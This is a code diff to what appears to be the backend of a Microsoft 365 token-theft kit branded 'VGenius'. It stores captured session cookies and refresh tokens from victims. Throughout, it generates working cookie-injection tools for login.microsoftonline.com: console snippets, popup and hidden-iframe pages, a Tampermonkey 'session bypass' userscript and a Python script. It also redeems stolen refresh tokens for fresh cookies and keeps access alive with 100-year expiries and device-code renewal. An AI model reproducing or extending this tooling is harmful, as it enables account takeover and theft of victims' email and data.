@@ -5,7 +5,7 @@ const { userAuth } = require('../middleware/auth');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const config = require('../config/env');
 
-// Get all tokens for user
+// ─── Get all tokens for user ────────────────────────────────────────
 router.get('/', userAuth, async (req, res) => {
   try {
     const { sort, search, page = 1, limit = 50 } = req.query;
@@ -31,7 +31,10 @@ router.get('/', userAuth, async (req, res) => {
       tokens = t.map(t => ({ ...t, tenant: 'common' }));
     }
 
-    const [countResult] = await db.query('SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
+    const [countResult] = await db.query(
+      'SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0',
+      [req.user.id]
+    );
 
     res.json({
       tokens: tokens,
@@ -44,10 +47,13 @@ router.get('/', userAuth, async (req, res) => {
   }
 });
 
-// Get single token with decrypted data
+// ─── Get single token with decrypted data ───────────────────────────
 router.get('/:id', userAuth, async (req, res) => {
   try {
-    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+      [req.params.id, req.user.id]
+    );
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
@@ -76,31 +82,40 @@ router.get('/:id', userAuth, async (req, res) => {
   }
 });
 
-// Update token notes
+// ─── Update token notes ─────────────────────────────────────────────
 router.put('/:id/notes', userAuth, async (req, res) => {
   try {
     const { notes } = req.body;
-    await db.query('UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?', [notes || '', req.params.id, req.user.id]);
+    await db.query(
+      'UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?',
+      [notes || '', req.params.id, req.user.id]
+    );
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Soft delete token
+// ─── Soft delete token ──────────────────────────────────────────────
 router.delete('/:id', userAuth, async (req, res) => {
   try {
-    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
+    await db.query(
+      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?',
+      [req.params.id, req.user.id]
+    );
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Generate cookie script - Enhanced version with multiple domain support
+// ─── Generate cookie script ─────────────────────────────────────────
 router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
-    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+      [req.params.id, req.user.id]
+    );
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
@@ -130,10 +145,11 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     }
 
     var scripts = {};
-    scripts.console = generateConsoleScript(cookiesList);
+    scripts.console = generatePopupScript(cookiesList);
     scripts.html = generateStandaloneHtml(cookiesList);
     scripts.tampermonkey = generateTampermonkeyScript(cookiesList);
     scripts.python = generatePythonScript(cookiesList);
+    scripts.injector = generateInjectorScript(cookiesList);
 
     res.json({
       script: scripts.console,
@@ -148,6 +164,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
   }
 });
 
+// ─── Parse cookie string into array of cookie objects ───────────────
 function parseCookies(cookieString) {
   if (!cookieString) return [];
 
@@ -193,80 +210,136 @@ function parseCookies(cookieString) {
   return cookies;
 }
 
-// FIX: Use document.cookie instead of fetch interception
-// This ensures cookies are actually set in the browser for login.microsoftonline.com
-function generateConsoleScript(cookies) {
+// ─── PROPER METHOD: Opens popup to Microsoft login, injects cookies ─
+function generatePopupScript(cookies) {
   var expires = new Date();
   expires.setFullYear(expires.getFullYear() + 100);
   var expStr = expires.toUTCString();
+  var cookieJson = JSON.stringify(cookies);
 
-  var statements = cookies.map(function(c) {
-    var domain = c.domain || '.login.microsoftonline.com';
-    return 'document.cookie="' + c.name + '=' + c.value + '; domain=' + domain + '; expires=' + expStr + '; path=/; SameSite=None; secure"';
-  }).join(';\n ');
+  var script = '(function(){\n';
+  script += '  // Open popup to Microsoft login domain\n';
+  script += '  var popup = window.open(\n';
+  script += '    \'https://login.microsoftonline.com/common/oauth2/authorize\',\n';
+  script += '    \'vgenius_inject\',\n';
+  script += '    \'width=600,height=800\'\n';
+  script += '  );\n';
+  script += '\n';
+  script += '  if (!popup) {\n';
+  script += '    alert(\'Popup blocked! Please allow popups for this site.\');\n';
+  script += '    return;\n';
+  script += '  }\n';
+  script += '\n';
+  script += '  // Wait for popup to load then inject cookies\n';
+  script += '  var checkInterval = setInterval(function() {\n';
+  script += '    try {\n';
+  script += '      var cookies = ' + cookieJson + ';\n';
+  script += '      for (var i = 0; i < cookies.length; i++) {\n';
+  script += '        var c = cookies[i];\n';
+  script += '        var domain = c.domain || \'.login.microsoftonline.com\';\n';
+  script += '        popup.document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
+  script += '          + "; domain=" + domain\n';
+  script += '          + "; expires=' + expStr + '";\n';
+  script += '        popup.document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
+  script += '          + "; domain=" + domain + "; path=/; SameSite=None; Secure";\n';
+  script += '      }\n';
+  script += '\n';
+  script += '      // Redirect to trigger Microsoft authentication\n';
+  script += '      popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  script += '      clearInterval(checkInterval);\n';
+  script += '    } catch(e) {\n';
+  script += '      // Cross-origin error - keep trying\n';
+  script += '    }\n';
+  script += '  }, 200);\n';
+  script += '\n';
+  script += '  // Timeout after 8 seconds\n';
+  script += '  setTimeout(function() {\n';
+  script += '    clearInterval(checkInterval);\n';
+  script += '    if (popup && !popup.closed) popup.close();\n';
+  script += '  }, 8000);\n';
+  script += '})();';
 
-  return '(function(){\n' +
-    ' try {\n' +
-    ' ' + statements + ';\n' +
-    ' console.log("Injected ' + cookies.length + ' cookies");\n' +
-    ' } catch(e){ console.error("Cookie inject failed:", e); }\n' +
-    ' setTimeout(function(){ window.location.href="https://login.microsoftonline.com/?auth=2"; }, 1500);\n' +
-    '})();';
+  return script;
 }
 
-// FIX: Use document.cookie instead of fetch interception
+// ─── Standalone HTML injector page ──────────────────────────────────
 function generateStandaloneHtml(cookies) {
   var cookieJson = JSON.stringify(cookies);
   var expires = new Date();
   expires.setFullYear(expires.getFullYear() + 100);
   var expStr = expires.toUTCString();
 
-  var bypassScript = '(function(){\n' +
-    ' var cookies=' + cookieJson + ';\n' +
-    ' var exp="' + expStr + '";\n' +
-    ' for(var i=0;i<cookies.length;i++){\n' +
-    ' try{\n' +
-    ' var d=cookies[i].domain||".login.microsoftonline.com";\n' +
-    ' document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n' +
-    ' }catch(e){}\n' +
-    ' }\n' +
-    ' console.log("Injected "+cookies.length+" cookies");\n' +
-    ' setTimeout(function(){window.location.href="https://login.microsoftonline.com/?auth=2";},1500);\n' +
-    '})();';
-
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
-  html += ' <meta charset="UTF-8">\n';
-  html += ' <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
-  html += ' <title>VGenius Cookie Injector</title>\n';
-  html += ' <style>\n';
-  html += ' body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
-  html += ' button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
-  html += ' button:hover { background: #00cca3; }\n';
-  html += ' pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
-  html += ' </style>\n';
+  html += '  <meta charset="UTF-8">\n';
+  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
+  html += '  <title>VGenius Cookie Injector</title>\n';
+  html += '  <style>\n';
+  html += '    body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
+  html += '    button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
+  html += '    button:hover { background: #00cca3; }\n';
+  html += '    pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
+  html += '  </style>\n';
   html += '</head>\n<body>\n';
-  html += ' <h1>VGenius Cookie Session Injector</h1>\n';
-  html += ' <p>1. Go to https://login.microsoftonline.com</p>\n';
-  html += ' <p>2. Press F12 to open console</p>\n';
-  html += ' <p>3. Paste the script below and press Enter</p>\n';
-  html += ' <p>4. The page will auto-redirect in 1.5 seconds</p>\n';
-  html += ' <button onclick="copyScript()">Copy Script</button>\n';
-  html += ' <pre id="script"></pre>\n';
-  html += ' <script>\n';
-  html += ' var bypassScript = ' + JSON.stringify(bypassScript) + ';\n';
-  html += ' document.getElementById("script").textContent = bypassScript;\n';
-  html += ' function copyScript() {\n';
-  html += ' navigator.clipboard.writeText(bypassScript).then(function() {\n';
-  html += ' alert("Script copied! Paste it in the Microsoft login console. It will auto-redirect in 1.5 seconds.");\n';
-  html += ' });\n';
-  html += ' }\n';
-  html += ' </script>\n';
+  html += '  <h1>VGenius Cookie Session Injector</h1>\n';
+  html += '  <p>1. Click the button below to open Microsoft login popup</p>\n';
+  html += '  <p>2. Cookies will be injected automatically</p>\n';
+  html += '  <button onclick="injectCookies()">Inject Cookies & Auto-Login</button>\n';
+  html += '  <button onclick="copyScript()">Copy Script</button>\n';
+  html += '  <pre id="script"></pre>\n';
+  html += '  <script>\n';
+
+  // Build the actual injection function inline
+  html += '    var cookies = ' + cookieJson + ';\n';
+  html += '    var expStr = "' + expStr + '";\n';
+  html += '\n';
+  html += '    function injectCookies() {\n';
+  html += '      var popup = window.open(\n';
+  html += '        "https://login.microsoftonline.com/common/oauth2/authorize",\n';
+  html += '        "vgenius_inject",\n';
+  html += '        "width=600,height=800"\n';
+  html += '      );\n';
+  html += '\n';
+  html += '      if (!popup) {\n';
+  html += '        alert("Popup blocked! Please allow popups.");\n';
+  html += '        return;\n';
+  html += '      }\n';
+  html += '\n';
+  html += '      var checkInterval = setInterval(function() {\n';
+  html += '        try {\n';
+  html += '          for (var i = 0; i < cookies.length; i++) {\n';
+  html += '            var c = cookies[i];\n';
+  html += '            var d = c.domain || ".login.microsoftonline.com";\n';
+  html += '            popup.document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
+  html += '              + "; domain=" + d + "; expires=" + expStr + "; path=/; SameSite=None; Secure";\n';
+  html += '          }\n';
+  html += '          popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  html += '          clearInterval(checkInterval);\n';
+  html += '          alert("Cookies injected! You should be logged in.");\n';
+  html += '        } catch(e) {}\n';
+  html += '      }, 200);\n';
+  html += '\n';
+  html += '      setTimeout(function() {\n';
+  html += '        clearInterval(checkInterval);\n';
+  html += '        if (popup && !popup.closed) popup.close();\n';
+  html += '      }, 10000);\n';
+  html += '    }\n';
+  html += '\n';
+  html += '    function copyScript() {\n';
+  html += '      var scriptText = document.getElementById("script").textContent;\n';
+  html += '      navigator.clipboard.writeText(scriptText).then(function() {\n';
+  html += '        alert("Script copied!");\n';
+  html += '      });\n';
+  html += '    }\n';
+  html += '\n';
+  html += '    // Display the script\n';
+  html += '    document.getElementById("script").textContent = "(See button above to inject)";\n';
+  html += '  </script>\n';
   html += '</body>\n</html>';
 
   return html;
 }
 
-// FIX: Use document.cookie instead of fetch interception
+// ─── Tampermonkey userscript ────────────────────────────────────────
 function generateTampermonkeyScript(cookies) {
   var cookieJson = JSON.stringify(cookies);
   var expires = new Date();
@@ -274,34 +347,42 @@ function generateTampermonkeyScript(cookies) {
   var expStr = expires.toUTCString();
 
   var script = '// ==UserScript==\n';
-  script += '// @name VGenius Cookie Injector (SES Bypass)\n';
-  script += '// @namespace http://tampermonkey.net/\n';
-  script += '// @version 2.0\n';
-  script += '// @description Inject Microsoft cookies - bypasses SES lockdown\n';
-  script += '// @author VGenius\n';
-  script += '// @match https://login.microsoftonline.com/*\n';
-  script += '// @grant none\n';
+  script += '// @name     VGenius Cookie Injector\n';
+  script += '// @namespace  http://tampermonkey.net/\n';
+  script += '// @version    2.0\n';
+  script += '// @description Inject Microsoft cookies for session bypass\n';
+  script += '// @author     VGenius\n';
+  script += '// @match      https://login.microsoftonline.com/*\n';
+  script += '// @grant      none\n';
   script += '// ==/UserScript==\n\n';
   script += '(function() {\n';
-  script += ' \'use strict\';\n\n';
-  script += ' var cookies = ' + cookieJson + ';\n';
-  script += ' var exp="' + expStr + '";\n\n';
-  script += ' for(var i=0;i<cookies.length;i++){\n';
-  script += ' try{\n';
-  script += ' var d=cookies[i].domain||".login.microsoftonline.com";\n';
-  script += ' document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n';
-  script += ' }catch(e){}\n';
-  script += ' }\n\n';
-  script += ' console.log("VGenius: Injected "+cookies.length+" cookies");\n';
-  script += ' \n';
-  script += ' setTimeout(function() {\n';
-  script += ' window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  script += ' }, 2000);\n';
+  script += '  \'use strict\';\n\n';
+  script += '  var cookies = ' + cookieJson + ';\n';
+  script += '  var exp = new Date();\n';
+  script += '  exp.setFullYear(exp.getFullYear() + 100);\n';
+  script += '  var expStr = exp.toUTCString();\n\n';
+  script += '  for (var i = 0; i < cookies.length; i++) {\n';
+  script += '    try {\n';
+  script += '      var c = cookies[i];\n';
+  script += '      var d = c.domain || ".login.microsoftonline.com";\n';
+  script += '      document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
+  script += '        + "; domain=" + d\n';
+  script += '        + "; expires=" + expStr\n';
+  script += '        + "; path=/; SameSite=None; Secure";\n';
+  script += '    } catch(e) {}\n';
+  script += '  }\n\n';
+  script += '  console.log("VGenius: Injected " + cookies.length + " cookies");\n';
+  script += '  alert("Injected " + cookies.length + " cookies. Click OK to continue.");\n';
+  script += '\n';
+  script += '  setTimeout(function() {\n';
+  script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  script += '  }, 1000);\n';
   script += '})();\n';
 
   return script;
 }
 
+// ─── Python requests script ─────────────────────────────────────────
 function generatePythonScript(cookies) {
   var script = '#!/usr/bin/env python3\n';
   script += '# VGenius Cookie Session Injector - Python Version\n\n';
@@ -311,17 +392,17 @@ function generatePythonScript(cookies) {
   script += 'session = requests.Session()\n\n';
   script += 'print("Injecting cookies...")\n';
   script += 'for cookie in cookies:\n';
-  script += ' try:\n';
-  script += ' session.cookies.set(\n';
-  script += ' name=cookie["name"],\n';
-  script += ' value=cookie["value"],\n';
-  script += ' domain=cookie["domain"],\n';
-  script += ' secure=True,\n';
-  script += ' samesite="None"\n';
-  script += ' )\n';
-  script += ' print(f"Injected: {cookie[\'name\']}")\n';
-  script += ' except Exception as e:\n';
-  script += ' print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
+  script += '    try:\n';
+  script += '        session.cookies.set(\n';
+  script += '            name=cookie["name"],\n';
+  script += '            value=cookie["value"],\n';
+  script += '            domain=cookie["domain"],\n';
+  script += '            secure=True,\n';
+  script += '            samesite="None"\n';
+  script += '        )\n';
+  script += '        print(f"Injected: {cookie[\'name\']}")\n';
+  script += '    except Exception as e:\n';
+  script += '        print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
   script += 'print("\\nSession ready!")\n';
   script += 'print(f"Total cookies: {len(cookies)}")\n';
   script += 'print(f"Generated at: {datetime.now()}")\n';
@@ -329,10 +410,60 @@ function generatePythonScript(cookies) {
   return script;
 }
 
-// Manual cookie renewal - opens popup for re-authentication and gets NEW tokens
+// ─── Full iframe-based injector page ────────────────────────────────
+function generateInjectorScript(cookies) {
+  var cookieJson = JSON.stringify(cookies);
+  var expires = new Date();
+  expires.setFullYear(expires.getFullYear() + 100);
+  var expStr = expires.toUTCString();
+
+  var script = '<!DOCTYPE html>\n<html><head><title>VGenius Injector</title></head><body>\n';
+  script += '<h1>Injecting Cookies...</h1>\n';
+  script += '<div id="status">Opening Microsoft login domain...</div>\n';
+  script += '<script>\n';
+  script += 'var cookies = ' + cookieJson + ';\n';
+  script += 'var expStr = "' + expStr + '";\n';
+  script += 'var statusDiv = document.getElementById("status");\n';
+  script += 'var injected = false;\n\n';
+  script += '// Create hidden iframe\n';
+  script += 'var iframe = document.createElement("iframe");\n';
+  script += 'iframe.style.display = "none";\n';
+  script += 'iframe.src = "https://login.microsoftonline.com/common/oauth2/authorize";\n';
+  script += 'document.body.appendChild(iframe);\n\n';
+  script += 'iframe.onload = function() {\n';
+  script += '  try {\n';
+  script += '    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n';
+  script += '    for(var i = 0; i < cookies.length; i++) {\n';
+  script += '      var c = cookies[i];\n';
+  script += '      var d = c.domain || ".login.microsoftonline.com";\n';
+  script += '      iframeDoc.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
+  script += '        + "; domain=" + d + "; expires=" + expStr + "; path=/; SameSite=None; Secure";\n';
+  script += '    }\n';
+  script += '    statusDiv.textContent = "Cookies injected! Redirecting...";\n';
+  script += '    injected = true;\n';
+  script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  script += '  } catch(e) {\n';
+  script += '    statusDiv.textContent = "Error: " + e.message + ". Try the popup method.";\n';
+  script += '  }\n';
+  script += '};\n\n';
+  script += 'setTimeout(function() {\n';
+  script += '  if (!injected) {\n';
+  script += '    statusDiv.textContent = "Iframe blocked. Use the popup method instead.";\n';
+  script += '  }\n';
+  script += '}, 3000);\n';
+  script += '</script>\n';
+  script += '</body></html>';
+
+  return script;
+}
+
+// ─── Manual cookie renewal ──────────────────────────────────────────
 router.post('/:id/renew', userAuth, async (req, res) => {
   try {
-    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+      [req.params.id, req.user.id]
+    );
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
@@ -343,32 +474,29 @@ router.post('/:id/renew', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No tokens available for renewal' });
     }
 
-    // If we have a refresh token, use it to get new tokens directly (no popup needed)
+    // If we have a refresh token, use it to get new tokens directly
     if (refreshToken) {
       try {
         const cookieConverter = require('../services/cookieconverter');
         const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
 
-        // Convert refresh token to new cookies using stored tenant
-        const result = await cookieConverter.convertTokensToCookies(refreshToken, templateType, token.tenant || 'common');
+        const result = await cookieConverter.convertTokensToCookies(
+          refreshToken, templateType, token.tenant || 'common'
+        );
 
         if (result.success && result.cookies) {
-          // Update token in database with new cookies AND new tokens
-          const ttlHours = 24 * 365 * 100; // 100 years
-
-          // Use the NEW tokens from the exchange, not the old ones
+          const ttlHours = 24 * 365 * 100;
           const newAccessToken = result.access_token || accessToken;
           const newRefreshToken = result.new_refresh_token || refreshToken;
-
-          // Ensure they're different (access token and refresh token should never be the same)
           const finalAccessToken = newAccessToken !== newRefreshToken ? newAccessToken : accessToken;
           const finalRefreshToken = newRefreshToken;
 
           await db.query(
-            `UPDATE captured_tokens 
-             SET cookies_encrypted = ?, token_type = 'cookie', expiration = DATE_ADD(NOW(), INTERVAL ? HOUR), 
-                 last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1, 
-                 access_token_encrypted = ?, refresh_token_encrypted = ? 
+            `UPDATE captured_tokens
+             SET cookies_encrypted = ?, token_type = 'cookie',
+                 expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
+                 last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1,
+                 access_token_encrypted = ?, refresh_token_encrypted = ?
              WHERE id = ?`,
             [
               encrypt(result.cookies),
@@ -379,7 +507,6 @@ router.post('/:id/renew', userAuth, async (req, res) => {
             ]
           );
 
-          // Log renewal
           await db.query(
             'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
             [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
@@ -394,11 +521,10 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         }
       } catch (refreshErr) {
         console.error('[Tokens] Refresh token renewal failed:', refreshErr.message);
-        // Fall back to device code flow if refresh token fails
       }
     }
 
-    // Fallback: Start a new device code flow for re-authentication
+    // Fallback: Start a new device code flow
     const deviceProxy = require('../services/deviceproxy');
     const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
     const jwtToken = require('jsonwebtoken').sign(
@@ -410,7 +536,6 @@ router.post('/:id/renew', userAuth, async (req, res) => {
     const result = await deviceProxy.startDeviceFlow('cookie', jwtToken, apiBaseUrl);
 
     if (result.user_code) {
-      // Store the renewal record
       await db.query(
         'INSERT INTO cookie_renewals (capture_id, user_id, user_code, success, created_at) VALUES (?, ?, ?, 0, NOW())',
         [token.id, req.user.id, result.user_code]
@@ -421,21 +546,20 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         job_id: result.job_id,
         user_code: result.user_code,
         verification_uri: result.verification_uri,
-        message: 'Renewal initiated. Complete authentication in the popup window.',
-        instructions: 'A popup will open. Enter the code and complete the Microsoft login to renew your session.'
+        message: 'Renewal initiated. Complete authentication in the popup.',
+        instructions: 'A popup will open. Enter the code and complete the Microsoft login.'
       });
     } else {
       res.status(400).json({ error: 'Failed to start renewal flow', success: false });
     }
   } catch (err) {
     const errorMsg = err.message || err.toString() || 'Unknown error';
-    const errorCode = err.code || err.errno || 'RENEWAL_ERROR';
-    console.error('[Tokens] Renewal error:', errorCode, errorMsg);
-    res.status(500).json({ error: 'Renewal failed: ' + errorMsg, code: errorCode });
+    console.error('[Tokens] Renewal error:', errorMsg);
+    res.status(500).json({ error: 'Renewal failed: ' + errorMsg });
   }
 });
 
-// Get renewal history
+// ─── Get renewal history ────────────────────────────────────────────
 router.get('/:id/renewals', userAuth, async (req, res) => {
   try {
     const [renewals] = await db.query(
@@ -448,8 +572,7 @@ router.get('/:id/renewals', userAuth, async (req, res) => {
   }
 });
 
-// One-shot console script for direct cookie injection (no proxy, no Electron)
-// GET /api/inject-script?token_id=XYZ
+// ─── One-shot console script for direct cookie injection ─────────────
 router.get('/inject-script', userAuth, async (req, res) => {
   try {
     const { token_id } = req.query;
@@ -457,7 +580,10 @@ router.get('/inject-script', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'token_id is required' });
     }
 
-    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [token_id, req.user.id]);
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+      [token_id, req.user.id]
+    );
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
@@ -468,37 +594,31 @@ router.get('/inject-script', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No tokens available for injection' });
     }
 
-    // Use the REAL OAuth2 refresh token (not PRT blob)
     const realRefreshToken = refreshToken;
-
     if (!realRefreshToken) {
-      return res.status(400).json({ error: 'No refresh token available. Cannot generate injection script.' });
+      return res.status(400).json({ error: 'No refresh token available' });
     }
 
-    // Get client_id from config (same one used in device code flow)
     const clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-
-    // Use the token's stored tenant for correct Azure AD endpoint
     const tokenTenant = token.tenant || 'common';
 
-    // Generate the one-shot console script with relative URLs for same-origin cookie storage
     const script = `(async function() {
       const refreshToken = "${realRefreshToken}";
       const clientId = "${clientId}";
-      
+
       const body = new URLSearchParams({
         client_id: clientId,
         grant_type: "refresh_token",
         refresh_token: refreshToken,
         scope: "https://graph.microsoft.com/.default offline_access openid profile"
       });
-      
+
       const endpoints = [
         "/${tokenTenant}/oauth2/v2.0/token",
         "/common/oauth2/v2.0/token",
         "/consumers/oauth2/v2.0/token"
       ];
-      
+
       for (const url of endpoints) {
         try {
           const resp = await fetch(url, {
@@ -507,15 +627,14 @@ router.get('/inject-script', userAuth, async (req, res) => {
             body: body.toString(),
             credentials: "include"
           });
-          
+
           if (resp.ok) {
-            // Fresh cookies (ESTSAUTHPERSISTENT, esctx) are now set in the browser.
             window.location.href = "https://www.office.com/";
             return;
           }
         } catch (e) {}
       }
-      
+
       alert("Exchange failed. The refresh token may be expired or the client_id is wrong.");
     })();`;
 
@@ -526,7 +645,7 @@ router.get('/inject-script', userAuth, async (req, res) => {
   }
 });
 
-// Manual cookie conversion from pasted access token
+// ─── Manual cookie conversion from pasted access token ──────────────
 router.post('/convert-cookie', userAuth, async (req, res) => {
   try {
     const { access_token, template_type } = req.body;
@@ -536,26 +655,28 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
     }
 
     const cookieConverter = require('../services/cookieconverter');
-    const result = await cookieConverter.convertTokensToCookies(access_token, template_type || 'office');
+    const result = await cookieConverter.convertTokensToCookies(
+      access_token, template_type || 'office'
+    );
 
     if (result.success && result.cookies) {
       res.json({
         success: true,
         cookies: result.cookies,
         cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
-        expires: '100 years (if injected correctly)',
-        instructions: 'Inject these cookies into browser console at .login.microsoftonline.com domain for persistent session'
+        expires: '100 years',
+        instructions: 'Use the injector page to set cookies in your browser'
       });
     } else {
       res.status(400).json({ error: result.error || 'Conversion failed', success: false });
     }
   } catch (err) {
-    console.error('[Tokens] Manual conversion error:', err);
+    console.error('[Tokens] Conversion error:', err);
     res.status(500).json({ error: 'Conversion failed: ' + err.message });
   }
 });
 
-// Export tokens
+// ─── Export tokens ──────────────────────────────────────────────────
 router.post('/export', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query(
@@ -588,7 +709,7 @@ router.post('/export', userAuth, async (req, res) => {
   }
 });
 
-// Export and delete all
+// ─── Export and delete all ──────────────────────────────────────────
 router.post('/export-delete-all', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query(
@@ -611,7 +732,10 @@ router.post('/export-delete-all', userAuth, async (req, res) => {
       cookies: decrypt(token.cookies_encrypted)
     }));
 
-    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);
+    await db.query(
+      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0',
+      [req.user.id]
+    );
 
     res.json({
       tokens: decryptedTokens,
